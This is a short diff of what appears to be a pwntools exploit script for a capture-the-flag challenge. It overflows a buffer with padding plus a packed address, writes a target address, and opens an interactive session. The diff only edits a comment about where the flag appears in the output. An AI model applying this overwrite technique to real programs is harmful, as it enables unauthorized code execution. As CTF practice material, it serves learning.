@@ -10,4 +10,4 @@ p.writeline(bytes([ord('a')] * 0x60) + p32(0x804a004))
 p.writeline(str(0x80485d7).encode('ascii'))
 p.interactive()
 # the flag will be written to output
-# it's the line before "Now I can safely trust you that you have credential :)"
+# it's the line right before "Now I can safely trust you that you have credential :)"
